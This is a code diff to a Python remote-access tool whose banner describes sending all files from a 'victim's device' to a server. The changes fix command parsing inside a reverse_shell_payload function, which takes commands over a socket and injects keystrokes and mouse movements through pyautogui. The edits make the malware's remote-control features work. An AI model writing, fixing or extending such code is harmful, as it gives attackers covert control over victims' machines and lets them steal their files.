@@ -63,7 +63,7 @@ banner = r"""
  -send-all: send all files for current directory from victim's device to the server.
 """
 def write_keyboards(command, delay=0.05):
-    if command.startswith('write "') and command.endswith('"'):
+    if command.startswith('write"') and command.endswith('"'):
         text = command[7:-1]
         pyautogui.write(text, interval=delay)
 def move_mouse(command, duration=0.1):
@@ -314,10 +314,10 @@ def reverse_shell_payload():
            cmd = s.recv(1024).decode("utf-8").strip()
            if not cmd:
                continue
-           if cmd.lower().startswith() == "write":
+           if cmd.lower().startswith("write"):
                write_keyboards(cmd)
                continue
-           if cmd.lower().startswith() == "move":
+           if cmd.lower().startswith("move"):
                move_mouse(cmd)
                continue
            if cmd.lower() == "stream-screen":
